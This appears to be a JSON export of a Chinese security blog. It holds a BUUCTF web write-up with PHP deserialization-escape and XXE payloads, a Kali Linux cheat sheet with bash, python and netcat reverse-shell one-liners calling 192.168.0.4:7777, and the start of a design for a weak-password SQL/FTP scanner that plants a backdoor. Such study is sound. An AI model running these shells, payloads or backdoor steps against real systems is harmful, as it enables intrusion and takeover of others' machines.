class=\"line\">\t\t\t&lt;label&gt;Nickname:&lt;/label&gt;</span><br><span class=\"line\">\t\t\t&lt;input type=&quot;text&quot; name=&quot;nickname&quot; style=&quot;height:30px&quot; class=&quot;span3&quot;&gt;</span><br><span class=\"line\">\t\t\t&lt;label for=&quot;file&quot;&gt;Photo:&lt;/label&gt;</span><br><span class=\"line\">\t\t\t&lt;input type=&quot;file&quot; name=&quot;photo&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class=\"line\">\t\t\t&lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;UPDATE&lt;/button&gt;</span><br><span class=\"line\">\t\t&lt;/form&gt;</span><br><span class=\"line\">\t&lt;/div&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>在 <code>profile.php</code> 中找到明显的 </p>\n<p><code>$photo = base64_encode(file_get_contents($profile[&#39;photo&#39;]));</code> </p>\n<p>读取文件内容，而 <code>flag</code> 放在 <code>config.php</code> 文件中，我们要想办法读这个文件。但是上面读文件的参数限定了 <code>photo</code> ，我们在 <code>update.php</code> 中找到有关代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>($_POST[<span class=\"string\">'phone'</span>] &amp;&amp; $_POST[<span class=\"string\">'email'</span>] &amp;&amp; $_POST[<span class=\"string\">'nickname'</span>] &amp;&amp; $_FILES[<span class=\"string\">'photo'</span>]) &#123;</span><br><span class=\"line\">    $username = $_SESSION[<span class=\"string\">'username'</span>];</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(!preg_match(<span class=\"string\">'/^\\d&#123;11&#125;$/'</span>, $_POST[<span class=\"string\">'phone'</span>]))</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">die</span>(<span class=\"string\">'Invalid phone'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(!preg_match(<span class=\"string\">'/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\\.[_a-zA-Z0-9]&#123;1,10&#125;$/'</span>, $_POST[<span class=\"string\">'email'</span>]))</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">die</span>(<span class=\"string\">'Invalid email'</span>);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(preg_match(<span class=\"string\">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class=\"string\">'nickname'</span>]) || strlen($_POST[<span class=\"string\">'nickname'</span>]) &gt; <span class=\"number\">10</span>)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">die</span>(<span class=\"string\">'Invalid nickname'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$file = $_FILES[<span class=\"string\">'photo'</span>];</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>($file[<span class=\"string\">'size'</span>] &lt; <span class=\"number\">5</span> <span class=\"keyword\">or</span> $file[<span class=\"string\">'size'</span>] &gt; <span class=\"number\">1000000</span>)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">die</span>(<span class=\"string\">'Photo size error'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tmove_uploaded_file($file[<span class=\"string\">'tmp_name'</span>], <span class=\"string\">'upload/'</span> . md5($file[<span class=\"string\">'name'</span>]));</span><br><span class=\"line\">\t\t$profile[<span class=\"string\">'phone'</span>] = $_POST[<span class=\"string\">'phone'</span>];</span><br><span class=\"line\">\t\t$profile[<span class=\"string\">'email'</span>] = $_POST[<span class=\"string\">'email'</span>];</span><br><span class=\"line\">\t\t$profile[<span class=\"string\">'nickname'</span>] = $_POST[<span class=\"string\">'nickname'</span>];</span><br><span class=\"line\">\t\t$profile[<span class=\"string\">'photo'</span>] = <span class=\"string\">'upload/'</span> . md5($file[<span class=\"string\">'name'</span>]);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t$user-&gt;update_profile($username, serialize($profile));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>需要 <code>POST</code> 四个参数，并且发现 对 <code>nickname</code> 的过滤与前两个不同，可以使用数组绕过。</p>\n<p>然后对<code>$profile</code> 进行序列化并传入过滤函数进行过滤。我们接着看过滤函数</p>\n <figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">filter</span><span class=\"params\">($string)</span> </span>&#123;</span><br><span class=\"line\">\t\t$escape = <span class=\"keyword\">array</span>(<span class=\"string\">'\\''</span>, <span class=\"string\">'\\\\\\\\'</span>);</span><br><span class=\"line\">\t\t$escape = <span class=\"string\">'/'</span> . implode(<span class=\"string\">'|'</span>, $escape) . <span class=\"string\">'/'</span>; <span class=\"comment\">// \\|\\\\\\\\</span></span><br><span class=\"line\">\t\t$string = preg_replace($escape, <span class=\"string\">'_'</span>, $string);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$safe = <span class=\"keyword\">array</span>(<span class=\"string\">'select'</span>, <span class=\"string\">'insert'</span>, <span class=\"string\">'update'</span>, <span class=\"string\">'delete'</span>, <span class=\"string\">'where'</span>);</span><br><span class=\"line\">\t\t$safe = <span class=\"string\">'/'</span> . implode(<span class=\"string\">'|'</span>, $safe) . <span class=\"string\">'/i'</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> preg_replace($safe, <span class=\"string\">'hacker'</span>, $string);</span><br><span class=\"line\">\t&#125;</span><br></pre></td></tr></table></figure>\n\n<p>发现从 <code>where</code> -&gt; <code>hacker</code> ,长度增加，联想到之前的反序列化字符逃逸。</p>\n<p>我们在本地实验得到序列化后的字符串是(注意已经将nickname改为数组)</p>\n<p><code>a:4:{s:5:&quot;phone&quot;;s:11:&quot;12345678912&quot;;s:5:&quot;email&quot;;s:11:&quot;123@123.com&quot;;s:8:&quot;nickname&quot;;a:1:{i:0;s:5:&quot;admin&quot;;}s:5:&quot;photo&quot;;s:39:&quot;upload/5ae0c1c8a5260bc7b6648f6fbd115c35&quot;;}</code></p>\n<p>我们想读的文件是 <code>config.pgp</code> ,也就是要添加<code>&quot;};s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code> ,长度为34，也就是说我们要追加 34 个 <code>where</code> </p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class=\"string\">\";&#125;s:5:\"</span>photo<span class=\"string\">\";s:10:\"</span>config.php<span class=\"string\">\";&#125;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">a:4:&#123;s:5:\"</span>phone<span class=\"string\">\";s:11:\"</span><span class=\"number\">12345678901</span><span class=\"string\">\";s:5:\"</span>email<span class=\"string\">\";s:8:\"</span>ss@q.com<span class=\"string\">\";s:8:\"</span>nickname<span class=\"string\">\";a:1:&#123;i:0;s:204:\"</span>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class=\"string\">\"&#125;;s:5:\"</span>photo<span class=\"string\">\";s:10:\"</span>config.php<span class=\"string\">\";&#125;s:39:\"</span>upload/<span class=\"number\">804</span>f743824c0451b2f60d81b63b6a900<span class=\"string\">\";&#125;</span></span><br></pre></td></tr></table></figure>\n\n<p>之后抓包修改 nickname 为数组，将值改为上面我们构造的内容即可。</p>\n<h2 id=\"real\"><a href=\"#real\" class=\"headerlink\" title=\"real\"></a>real</h2><p>12/19/2019 10:32:05 AM </p>\n<h3 id=\"php-xxe\"><a href=\"#php-xxe\" class=\"headerlink\" title=\"php_xxe\"></a>php_xxe</h3><p>libxml2 2.9.4之前版本，parser.c/xmlStringLenDecodeEntities函数存在XML外部实体漏洞，不在验证模式时，可使上下文独立的攻击者读取任意文件或造成拒绝服务。</p>\n<p>web目录./www包含4个文件：</p>\n<pre><code>$ tree .\n.\n├── dom.php # 示例：使用DOMDocument解析body\n├── index.php\n├── SimpleXMLElement.php # 示例：使用SimpleXMLElement类解析body\n└── simplexml_load_string.php # 示例：使用simplexml_load_string函数解析body</code></pre><p><code>dom.php</code>、<code>SimpleXMLElement.php</code>、<code>simplexml_load_string.php</code> 均可触发XXE漏洞</p>\n<p><strong>requests:</strong></p>\n<pre><code>GET /SimpleXMLElement.php HTTP/1.1\nHost: \nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\nCookie: __cfduid=d592021b2a53c58ae9e47dc1c1d5fbc361564715522; track_uuid=33b0bc28-89ab-4a63-da5c-d1b3ce520ac0\nUpgrade-Insecure-Requests: 1\nX-Forwarded-For: 127.0.0.1\nCache-Control: max-age=0\nContent-Length: 163\n\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; \n&lt;!DOCTYPE xxe [\n&lt;!ELEMENT name ANY &gt;\n&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;\n&lt;root&gt;\n&lt;name&gt;&amp;xxe;&lt;/name&gt;\n&lt;/root&gt;</code></pre><p><strong>response</strong></p>\n<pre><code>HTTP/1.1 200 OK\nHost: node3.buuoj.cn:26506\nConnection: close\nX-Powered-By: PHP/7.0.30\nContent-type: text/html; charset=UTF-8\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/bin/false</code></pre><p>还可以进行内网探测：</p>\n<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; \n&lt;!DOCTYPE xxe [\n&lt;!ELEMENT name ANY &gt;\n&lt;!ENTITY xxe SYSTEM &quot;file:///etc/hosts&quot; &gt;]&gt;\n&lt;root&gt;\n&lt;name&gt;&amp;xxe;&lt;/name&gt;\n&lt;/root&gt;\n\n127.0.0.1    localhost\n::1    localhost ip6-localhost ip6-loopback\nfe00::0    ip6-localnet\nff00::0    ip6-mcastprefix\nff02::1    ip6-allnodes\nff02::2    ip6-allrouters\n174.0.56.234    283819a6c89d</code></pre><p>常用的内网 IP 文件<code>/etc/hosts</code> 、 <code>/proc/net/arp</code> 、 <code>/proc/net/fib_trie</code></p>\n","text":"BUUCTF  wpWEBWarm up查看源码 &lt;?php    highlight_file(__FILE__);    class emmm    {        public static function checkFile(&amp;$page)       ","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"wp","slug":"wp","count":3,"path":"api/tags/wp.json"}]},{"title":"Kali-usage","slug":"Kali-usage","date":"2020-04-29T05:40:34.000Z","updated":"2020-04-29T05:47:09.267Z","comments":true,"path":"api/articles/Kali-usage.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"Kali-linux-使用备忘\"><a href=\"#Kali-linux-使用备忘\" class=\"headerlink\" title=\"Kali linux 使用备忘\"></a>Kali linux 使用备忘</h1><h2 id=\"网络无法连接\"><a href=\"#网络无法连接\" class=\"headerlink\" title=\"网络无法连接\"></a>网络无法连接</h2><ol>\n<li><p>ifconfig 只有 Local</p>\n<p>先检查一下 DNS 有没有忘记配置</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vi /etc/resolv.conf</span><br><span class=\"line\">   nameserver 8.8.8.8 or your dns server</span><br></pre></td></tr></table></figure>\n\n</li>\n</ol>\n<figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">   </span><br><span class=\"line\">检查一下 eth0 网卡</span><br><span class=\"line\">   </span><br><span class=\"line\">   ifconfig eth0 up</span><br><span class=\"line\">vi /etc/network/interfaces</span><br><span class=\"line\">   iface eth0 inet dhcp</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\"> service </span>networking restart</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"无法获得锁\"><a href=\"#无法获得锁\" class=\"headerlink\" title=\"无法获得锁\"></a>无法获得锁</h2><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">E: 无法获得锁 /var/lib/dpkg/lock - open (11: 资源暂时不可用)</span><br><span class=\"line\">E: 无法锁定管理目录(/var/lib/dpkg/)，是否有其他进程正占用它？</span><br></pre></td></tr></table></figure>\n\n<p>只要</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo rm /var/cache/apt/archives/lock </span><br><span class=\"line\">sudo rm /var/lib/dpkg/lock</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Environment-variables\"><a href=\"#Environment-variables\" class=\"headerlink\" title=\"Environment variables\"></a>Environment variables</h2><p>可以分为两大类：enviroment variables and shell variables</p>\n<p><strong>Enviroment varialbes</strong> : 可以在整个系统范围内使用，并且被所有衍生的子进程和 shells 所继承。</p>\n<p><strong>Shell varialbes</strong> : 只能被用于当前的 shell 。就像 zsh 和 bash ，每个 shell 都有自己的内部变量集。</p>\n<p>下面这些命令允许你列出来 enviroment vraiables 并且可以配置。</p>\n<ul>\n<li><code>env</code> – The command allows you to run another program in a  custom environment without modifying the current one. When used without  an argument it will print a list of the current environment variables.</li>\n<li><code>printenv</code> – The command prints all or the specified environment variables.</li>\n<li><code>set</code> – The command sets or unsets shell variables. When used without an argument it will print a list of all variables including  environment and shell variables, and shell functions.</li>\n<li><code>unset</code> – The command deletes shell and environment variables.</li>\n<li><code>export</code> – The command sets environment variables.</li>\n</ul>\n<h3 id=\"Persistent-Environment-Variables\"><a href=\"#Persistent-Environment-Variables\" class=\"headerlink\" title=\"Persistent Environment Variables\"></a>Persistent Environment Variables</h3><p>为了环境变量能持久(?) 我们需要到 bash 配置文件中定义一下。在大多数 Linux 发行版里我们需要重启一个会话。环境变量从下面几个文件里读取：</p>\n<ul>\n<li><p><code>/etc/environment</code> - Use this file to set up system-wide environment variables. Variables in this file are set in the following format:</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">FOO=bar</span><br><span class=\"line\">VAR_TEST=<span class=\"string\">\"Test Var\"</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>/etc/profile</code> - Variables set in this file are loaded  whenever a bash login shell is entered. When declaring environment  variables in this file you need to use the <code>export</code> command:</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">export JAVA_HOME=<span class=\"string\">\"/path/to/java/home\"</span></span><br><span class=\"line\">export PATH=<span class=\"variable\">$PATH:</span><span class=\"variable\">$JAVA_HOME</span>/bin</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>Per-user shell specific configuration files. For example, if you are using Bash, you can declare the variables in the <code>~/.bashrc</code>:</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">export PATH=<span class=\"string\">\"<span class=\"variable\">$HOME</span>/bin:<span class=\"variable\">$PATH</span>\"</span></span><br></pre></td></tr></table></figure>\n\n</li>\n</ul>\n<p>To load the new environment variables into the current shell session use the <a href=\"https://linuxize.com/post/bash-source-command/\" target=\"_blank\" rel=\"noopener\"><code>source</code></a> command:</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">source ~/.bashrc</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"bin\"><a href=\"#bin\" class=\"headerlink\" title=\"/bin\"></a>/bin</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/bin      是系统的一些指令。bin为binary的简写主要放置一些系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、<span class=\"built_in\">kill</span>、ls、mkdir、more、mount、rm、su、tar等。    </span><br><span class=\"line\">/sbin     一般是指超级用户指令。主要放置一些系统管理的必备程式例如:cfdisk、dhcpcd、dump、e2fsck、fdisk、halt、ifconfig、ifup、 ifdown、init、insmod、lilo、lsmod、mke2fs、modprobe、quotacheck、reboot、rmmod、 runlevel、shutdown等。   </span><br><span class=\"line\">/usr/bin　是你在后期安装的一些软件的运行脚本。主要放置一些应用软体工具的必备执行档例如c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome*、 gzip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、 newaliases、nslookup passwd、quota、smb*、wget等。</span><br><span class=\"line\">/usr/sbin 放置一些用户安装的系统管理的必备程式例如:dhcpd、httpd、imap、<span class=\"keyword\">in</span>.*d、inetd、lpd、named、netconfig、nmbd、samba、sendmail、squid、swap、tcpd、tcpdump等。    </span><br><span class=\"line\">如果新装的系统，运行一些很正常的诸如：shutdown，fdisk的命令时，悍然提示：bash:<span class=\"built_in\">command</span> not found。那么首先就要考虑root 的<span class=\"variable\">$PATH</span>里是否已经包含了这些环境变量。    </span><br><span class=\"line\">可以查看PATH，如果是：PATH=<span class=\"variable\">$PATH</span>:<span class=\"variable\">$HOME</span>/bin则需要添加成如下：PATH=<span class=\"variable\">$PATH</span>:<span class=\"variable\">$HOME</span>/bin:/sbin:/usr/bin:/usr/sbin</span><br></pre></td></tr></table></figure>\n\n<p>在 Kali 中我们可以看到 /bin/sh 是一个静态链接，链接到 <code>dash</code> ,而 <code>dash</code> 与 <code>bash</code> 一样，作为系统 <code>shell</code> 使用。</p>\n<p>查看当前使用 shell</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ll `which sh`</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"扫描\"><a href=\"#扫描\" class=\"headerlink\" title=\"扫描\"></a>扫描</h2><h3 id=\"主机发现\"><a href=\"#主机发现\" class=\"headerlink\" title=\"主机发现\"></a>主机发现</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">arp-scan -l</span><br><span class=\"line\"></span><br><span class=\"line\">nmap -sn 192.168.0.0/24</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"端口扫描\"><a href=\"#端口扫描\" class=\"headerlink\" title=\"端口扫描\"></a>端口扫描</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -p- -A 192.168.0.105</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"指纹识别\"><a href=\"#指纹识别\" class=\"headerlink\" title=\"指纹识别\"></a>指纹识别</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">whatweb url</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h2><h3 id=\"搜索脚本\"><a href=\"#搜索脚本\" class=\"headerlink\" title=\"搜索脚本\"></a>搜索脚本</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">searchsploit druopl 7</span><br></pre></td></tr></table></figure>\n\n<p>如果是 py 文件，可以直接根据提供的路径运行</p>\n<h2 id=\"反弹shell\"><a href=\"#反弹shell\" class=\"headerlink\" title=\"反弹shell\"></a>反弹shell</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp; /dev/tcp/192.168.0.4/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure>\n\n<p>python</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&apos;192.168.0.4&apos;,7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&apos;/bin/bash&apos;,&apos;-i&apos;]);</span><br></pre></td></tr></table></figure>\n\n<p>nc 反向连接，前提是目标机器有nc</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -e /bin/bash 192.168.0.4 7777</span><br></pre></td></tr></table></figure>\n\n<p>nc 安装</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、下载安装</span><br><span class=\"line\">wget https://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz/download</span><br><span class=\"line\">tar -zxvf netcat-0.7.1.tar.gz -C /usr/local</span><br><span class=\"line\">cd /usr/local</span><br><span class=\"line\">mv netcat-0.7.1 netcat</span><br><span class=\"line\">cd /usr/local/netcat</span><br><span class=\"line\">./configure</span><br><span class=\"line\">make &amp;&amp; make install</span><br><span class=\"line\">2、配置</span><br><span class=\"line\">vim /etc/profile</span><br><span class=\"line\">添加以下内容：</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> <span class=\"built_in\">set</span>  netcat path</span></span><br><span class=\"line\">export NETCAT_HOME=/usr/local/netcat</span><br><span class=\"line\">export PATH=$PATH:$NETCAT_HOME/bin</span><br><span class=\"line\">保存，退出，并使配置生效：</span><br><span class=\"line\">source /etc/profile</span><br><span class=\"line\">3、测试</span><br><span class=\"line\">nc -help成功</span><br></pre></td></tr></table></figure>\n\n","text":"Kali linux 使用备忘网络无法连接ifconfig 只有 Local先检查一下 DNS 有没有忘记配置1<br>2<br>vi /etc/resolv.conf<br>   nameserver 8.8.8.8 or your dns server<br>1<br>2<b","link":"","raw":null,"photos":[],"categories":[{"name":"linux","slug":"linux","count":1,"path":"api/categories/linux.json"}],"tags":[{"name":"linux","slug":"linux","count":1,"path":"api/tags/linux.json"}]},{"title":"互联网sql、ftp服务弱口令探测","slug":"互联网sql、ftp服务弱口令探测","date":"2020-04-29T05:40:34.000Z","updated":"2020-04-29T05:48:15.656Z","comments":true,"path":"api/articles/互联网sql、ftp服务弱口令探测.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"互联网sql、ftp服务弱口令探测\"><a href=\"#互联网sql、ftp服务弱口令探测\" class=\"headerlink\" title=\"互联网sql、ftp服务弱口令探测\"></a>互联网sql、ftp服务弱口令探测</h1><p>12/11/2019 1:26:12 PM </p>\n<h2 id=\"设计思路\"><a href=\"#设计思路\" class=\"headerlink\" title=\"设计思路\"></a>设计思路</h2><ul>\n<li>给定网段，扫描存活主机(<code>def get_ip</code>)，将IP地址存放在 <code>iprange.txt</code> 中</li>\n<li>由于这一阶段的探测目标是指定服务，因此我们跳过端口扫描阶段，直接进行特定端口探测(<code>def port_scan</code>)</li>\n<li>对于开放目标服务的端口尝试进行弱口令登陆，弱口令密码存放在 <code>dict.txt</code> 中(‘<code>def try_login</code>‘)</li>\n<li>对于 <code>sqlserver</code> ，如果登陆成功，则创建后门服务</li>\n<li>实现图形化界面，采用 Qt desinger 技术</li>\n<li>语言选择 python 2.0+ ，并使用多线程技术</li>\n</ul>\n<h2 id=\"互联网主机探活\"><a href=\"#互联网主机探活\" class=\"headerlink\" title=\"互联网主机探活\"></a>互联网主机探活</h2><p>对于主机探活部分参考 nmap 的说明文档</p>\n<blockquote>\n<p>任何网络探测任务的最初几个步骤之一就是把一组IP范围(有时该范围是巨大的)缩小为 一列活动的或者您感兴趣的主机。扫描每个IP的每个端口很慢，通常也没必要。 当然，什么样的主机令您感兴趣主要依赖于扫描的目的。网管也许只对运行特定服务的 主机感兴趣，而从事安全的人士则可能对一个马桶都感兴趣，只要它有IP地址:-)。一个系统管理员 也许仅仅使用Ping来定位内网上的主机，而一个外部入侵测试人员则可能绞尽脑汁用各种方法试图 突破防火墙的封锁。</p>\n<p>由于主机发现的需求五花八门，Nmap提供了一箩筐的选项来定制您的需求。 主机发现有时候也叫做ping扫描，但它远远超越用世人皆知的ping工具 发送简单的ICMP回声请求报文。用户完全可以通过使用列表扫描(-sL)或者 通过关闭ping (-P0)跳过ping的步骤，也可以使用多个端口把TCP SYN/ACK，UDP和ICMP 任意组合起来玩一玩。这些探测的目的是获得响应以显示某个IP地址是否是活动的(正在被某 主机或者网络设备使用)。 在许多网络上，在给定的时间，往往只有小部分的IP地址是活动的。 这种情况在基于RFC1918的私有地址空间如10.0.0.0/8尤其普遍。 那个网络有16,000,000个IP，但我见过一些使用它的公司连1000台机器都没有。 主机发现能够找到零星分布于IP地址海洋上的那些机器。</p>\n</blockquote>\n<p>在这里我选择使用 arp 协议进行探测，使用 arp 协议效率高，速度快，但只限于同一局域网</p>\n<h3 id=\"arp-地址解析协议\"><a href=\"#arp-地址解析协议\" class=\"headerlink\" title=\"arp 地址解析协议\"></a>arp 地址解析协议</h3><p>来自维基百科</p>\n<blockquote>\n<p>以主机A（192.168.38.10）向主机B（192.168.38.11）发送数据为例。</p>\n<p>1.当发送数据时，主机A会在自己的ARP缓存表中寻找是否有目标IP地址。如果找到就知道目标MAC地址为（00-BB-00-62-C2-02），直接把目标MAC地址写入帧里面发送就可。<br>2.如果在ARP缓存表中没有找到相对应的IP地址，主机A就会在网络上发送一个广播（ARP 